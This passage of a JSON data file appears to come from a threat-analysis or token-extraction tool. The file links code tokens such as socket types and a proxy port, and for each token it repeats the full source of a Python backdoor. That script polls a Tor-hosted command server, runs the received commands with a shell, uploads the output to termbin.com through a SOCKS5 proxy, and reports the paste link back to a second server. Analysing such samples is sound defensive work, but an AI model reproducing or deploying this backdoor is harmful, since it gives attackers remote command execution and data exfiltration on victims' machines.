                        "dst": {
                            "id": "<UNKNOWNWORD_0x1d0e0e13>",
                            "type": "UnknownWord",
                            "value": "af_inet"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc23fab37>",
                    "type": "UnknownWord",
                    "value": "sock_stream"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xc23fab37>",
                            "type": "UnknownWord",
                            "value": "sock_stream"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbeb4976f>",
                    "type": "UnknownWord",
                    "value": "9050"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbeb4976f>",
                            "type": "UnknownWord",
                            "value": "9050"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbeb4976f>",
                            "type": "UnknownWord",
                            "value": "9050"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8b77d438>",
                    "type": "UnknownWord",
                    "value": "proxy_type_socks5"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8b77d438>",
                            "type": "UnknownWord",
                            "value": "proxy_type_socks5"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8b77d438>",
                            "type": "UnknownWord",
                            "value": "proxy_type_socks5"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xedd12391>",
                    "type": "UnknownWord",
                    "value": "recv"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xedd12391>",
                            "type": "UnknownWord",
                            "value": "recv"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x817c96cb>",
                    "type": "UnknownWord",
                    "value": "termbin_url_created"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x817c96cb>",
                            "type": "UnknownWord",
                            "value": "termbin_url_created"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe2c75cb4>",
                    "type": "UnknownWord",
                    "value": "rstrip"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xe2c75cb4>",
                            "type": "UnknownWord",
                            "value": "rstrip"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbac8d6cc>",
                    "type": "UnknownWord",
                    "value": "x00"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbac8d6cc>",
                            "type": "UnknownWord",
                            "value": "x00"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xde5a0231>",
                    "type": "UnknownWord",
                    "value": "termbin_header"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xde5a0231>",
                            "type": "UnknownWord",
                            "value": "termbin_header"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6c37bdcd>",
                    "type": "UnknownWord",
                    "value": "exception"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8264cbcf>",
                    "type": "UnknownWord",
                    "value": "check_cmd"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> 